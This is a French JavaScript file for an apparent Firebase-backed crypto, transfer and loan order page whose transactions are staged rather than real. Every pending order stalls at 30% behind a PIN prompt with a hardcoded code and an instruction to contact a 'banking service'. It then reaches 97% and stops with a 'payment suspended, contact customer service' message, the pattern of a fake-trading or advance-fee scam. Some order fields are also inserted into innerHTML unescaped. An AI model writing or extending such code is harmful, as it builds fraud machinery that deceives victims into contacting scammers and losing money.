// js/ordres-firebase.js
import { auth, db } from '../firebase-config.js';
import {
    collection,
    addDoc,
    query,
    where,
    onSnapshot,
    orderBy
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";

document.addEventListener('DOMContentLoaded', function () {
    // Éléments DOM
    const orderTypeSelect = document.getElementById('orderType');
    const assetSelect = document.getElementById('assetSelect');
    const amountInput = document.getElementById('amountInput');
    const limitInput = document.getElementById('limitInput');
    const form = document.querySelector('form');
    const ordersContainer = document.querySelector('.orders-container');

    // Options disponibles
    const allOptions = [
        { value: 'btc', text: 'Bitcoin (BTC)' },
        { value: 'eth', text: 'Ethereum (ETH)' },
        { value: 'usdt', text: 'Tether (USDT)' },
        { value: 'eur', text: 'Euro (EUR)' },
        { value: 'usd', text: 'Dollar (USD)' },
        { value: 'gbp', text: 'Livre Sterling (GBP)' }
    ];

    // Gestion auth
    onAuthStateChanged(auth, user => {
        if (user) {
            const userId = user.uid;
            setupOrderForm(userId);
            loadUserOrders(userId);
            setupUIInteractions();
            updateFormFields();
        } else {
            alert("Veuillez vous connecter pour gérer vos ordres.");
            window.location.href = "connexion.html";
        }
    });

    // FORMULAIRE
    function setupOrderForm(userId) {
        form.addEventListener('submit', async function (e) {
            e.preventDefault();

            const orderType = orderTypeSelect.value;
            const asset = assetSelect.value;
            const assetText = assetSelect.selectedOptions[0].textContent;
            const amount = parseFloat(amountInput.value);
            const timestamp = new Date();

            const ordreData = {
                type: orderType,
                asset: asset,
                assetLabel: assetText,
                montant: amount,
                userId: userId,
                statut: "en attente",
                createdAt: timestamp
            };

            try {
                await addDoc(collection(db, "ordres"), ordreData);
                form.reset();
                updateFormFields();
            } catch (error) {
                console.error("Erreur enregistrement :", error);
            }
        });
    }

    // AFFICHAGE ORDRES
    function loadUserOrders(userId) {
        const q = query(
            collection(db, "ordres"),
            where("userId", "==", userId),
            orderBy("createdAt", "desc")
        );

        onSnapshot(q, snapshot => {
            ordersContainer.innerHTML = "";

            if (snapshot.empty) {
                ordersContainer.innerHTML = `
                    <div class="no-orders">
                        <i class="fas fa-exchange-alt"></i>
                        <h4 class="mt-3" style="color: #fff;">Aucun ordre en cours</h4>
                        <p style="color: #fff;">Vos ordres actifs apparaîtront ici</p>
                    </div>
                `;
                return;
            }

            snapshot.forEach(doc => {
                const data = doc.data();
                const card = createOrderCard(data.type, data.assetLabel, data.montant);
                ordersContainer.appendChild(card);

                if (data.statut === "en attente") {
                    setTimeout(() => startOrderFlow(card), 1000);
                }
            });
        });
    }

    // FLUX ORDER COMPLET
    function startOrderFlow(card) {
        showProgressBar(card, 0, 30, () => {
            showPinModal(card);
        });
    }

    function showProgressBar(card, start, end, callback) {
        const progressHtml = `
            <div class="mt-3 w-100">
                <div class="progress" style="height: 18px;">
                    <div class="progress-bar progress-bar-striped progress-bar-animated" 
                         style="width: ${start}%">${start}%</div>
                </div>
            </div>`;

        card.insertAdjacentHTML('beforeend', progressHtml);
        animateProgress(card, start, end, 1500, callback);
    }

    function animateProgress(card, start, end, duration, callback) {
        const progressBar = card.querySelector('.progress-bar');
        let progress = start;
        const stepTime = 20;
        const steps = duration / stepTime;
        const increment = (end - start) / steps;

        const timer = setInterval(() => {
            progress += increment;
            if (progress >= end) {
                progress = end;
                clearInterval(timer);
                if (callback) callback();
            }
            progressBar.style.width = `${progress}%`;
            progressBar.textContent = `${Math.round(progress)}%`;
        }, stepTime);
    }

    // GESTION PIN
    function showPinModal(card) {
        if (document.getElementById('pinModal')) return;

        const modalHtml = `
        <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
          <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title">Validation requise</h5>
              </div>
              <div class="modal-body">
                <p class="text-muted small mt-2">Veuillez contacter le service bancaire pour recevoir votre code PIN ou résoudre le problème.</p>
                <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
                <input type="password" class="form-control mb-2" id="pinInput" maxlength="8" placeholder="Code PIN">
                <div id="pinError" class="text-danger" style="display:none;">Code PIN incorrect.</div>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-secondary" id="cancelPinBtn">Annuler</button>
                <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
              </div>
            </div>
          </div>
        </div>`;

        const modalDiv = document.createElement('div');
        modalDiv.innerHTML = modalHtml;
        document.body.appendChild(modalDiv);

        document.getElementById('validatePinBtn').onclick = function () {
            const pin = document.getElementById('pinInput').value.trim();
            if (pin !== "BT07CA91") {
                document.getElementById('pinError').style.display = 'block';
            } else {
                document.getElementById('pinError').style.display = 'none';
                document.getElementById('pinModal').remove();
                modalDiv.remove();
                continueTo97(card);
            }
        };

        document.getElementById('cancelPinBtn').onclick = function () {
            document.getElementById('pinModal').remove();
            modalDiv.remove();
            showCancellation(card);
        };
    }

    function continueTo97(card) {
        const progressBar = card.querySelector('.progress-bar');
        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
        progressBar.classList.add('bg-warning');

        animateProgress(card, 30, 97, 2000, () => {
            showSuspension(card);
        });
    }

    function showSuspension(card) {
        const progressBar = card.querySelector('.progress-bar');
        progressBar.classList.remove('bg-warning');
        progressBar.classList.add('bg-danger');

        const messageDiv = document.createElement('div');
        messageDiv.className = 'alert alert-danger mt-2 mb-0';
        messageDiv.innerHTML = `
            <i class="fas fa-exclamation-triangle me-2"></i>
            Paiement suspendu - Veuillez contacter le service client
        `;
        card.appendChild(messageDiv);

        const statusText = card.querySelector('.text-warning');
        if (statusText) {
            statusText.innerHTML = '<i class="fas fa-pause-circle me-1"></i>En attente de validation';
            statusText.className = 'text-danger mt-2';
        }
    }

    function showCancellation(card) {
        const progressBar = card.querySelector('.progress-bar');
        progressBar.style.width = '30%';
        progressBar.textContent = '30%';
        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
        progressBar.classList.add('bg-secondary');

        const messageDiv = document.createElement('div');
        messageDiv.className = 'alert alert-danger mt-2 mb-0';
        messageDiv.innerHTML = `
            <i class="fas fa-times-circle me-2"></i>
            Transaction annulée - Code PIN non validé
        `;
        card.appendChild(messageDiv);

        const statusText = card.querySelector('.text-warning');
        if (statusText) {
            statusText.innerHTML = '<i class="fas fa-ban me-1"></i>Transaction annulée';
            statusText.className = 'text-danger mt-2';
        }
    }

    // UI DYNAMIQUE
    function updateFormFields() {
        const orderType = orderTypeSelect.value;
        const assetLabel = document.getElementById('assetLabel');
        const amountLabel = document.getElementById('amountLabel');
        const limitLabel = document.getElementById('limitLabel');
        const rateInfo = document.getElementById('rateInfo');

        assetSelect.innerHTML = '';

        switch (orderType) {
            case 'limit':
                assetLabel.textContent = 'Solde principal';
                amountLabel.textContent = 'Montant du prêt';
                limitLabel.textContent = 'Total à rembourser';
                limitInput.readOnly = true;
                rateInfo.style.display = 'block';
                allOptions.filter(opt => ['eur', 'usd', 'gbp'].includes(opt.value)).forEach(addOption);
                amountInput.addEventListener('input', calculateRepayment);
                break;

            case 'transfer':
                assetLabel.textContent = 'Solde principal';
                amountLabel.textContent = 'Montant';
                limitLabel.textContent = 'Prix restant';
                limitInput.readOnly = false;
                rateInfo.style.display = 'none';
                allOptions.forEach(addOption);
                amountInput.removeEventListener('input', calculateRepayment);
                break;

            case 'buy':
            case 'sell':
                assetLabel.textContent = 'Choix de cryptomonnaie';
                amountLabel.textContent = 'Montant';
                limitLabel.textContent = 'Valeur exacte de la cryptomonnaie';
                limitInput.readOnly = false;
                rateInfo.style.display = 'none';
                allOptions.filter(opt => ['btc', 'eth', 'usdt'].includes(opt.value)).forEach(addOption);
                amountInput.removeEventListener('input', calculateRepayment);
                break;
        }
    }

    function addOption(currency) {
        const option = document.createElement('option');
        option.value = currency.value;
        option.textContent = currency.text;
        assetSelect.appendChild(option);
    }

    function calculateRepayment() {
        const amount = parseFloat(amountInput.value) || 0;
        limitInput.value = (amount * 1.03).toFixed(2);
    }

    function createOrderCard(type, asset, amount) {
        const typeData = {
            'buy': { label: 'Achat', class: 'buy' },
            'sell': { label: 'Vente', class: 'sell' },
            'transfer': { label: 'Transfert', class: 'transfer' },
            'limit': { label: 'Prêt', class: 'limit' }
        }[type];

        const card = document.createElement('div');
        card.className = `order-card ${typeData.class} mb-3 p-3 d-flex align-items-center`;
        card.innerHTML = `
            <div class="flex-grow-1">
                <div class="fw-bold mb-1">${typeData.label} - ${asset}</div>
                <div>Montant : <span class="fw-semibold">${amount}</span></div>
                <div class="text-warning mt-2"><i class="fas fa-spinner fa-spin me-1"></i>Transfert en cours</div>
            </div>
        `;
        return card;
    }

    function setupUIInteractions() {
        // Changement type d'ordre
        orderTypeSelect.addEventListener('change', updateFormFields);

        // Boutons de filtre
        document.querySelectorAll('.order-type-btn').forEach(btn => {
            btn.addEventListener('click', function () {
                document.querySelectorAll('.order-type-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
            });
        });

        // Animation cartes
        document.querySelectorAll('.card-style, .order-card').forEach(card => {
            card.addEventListener('mouseenter', () => {
                card.style.transform = 'translateY(-5px)';
                card.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
            });
            card.addEventListener('mouseleave', () => {
                card.style.transform = '';
                card.style.boxShadow = '';
            });
        });

        // Navigation
        document.querySelectorAll('.nav-button').forEach(button => {
            button.addEventListener('click', function () {
                if (!this.classList.contains('active')) {
                    document.querySelectorAll('.nav-button').forEach(btn => btn.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });
    }
});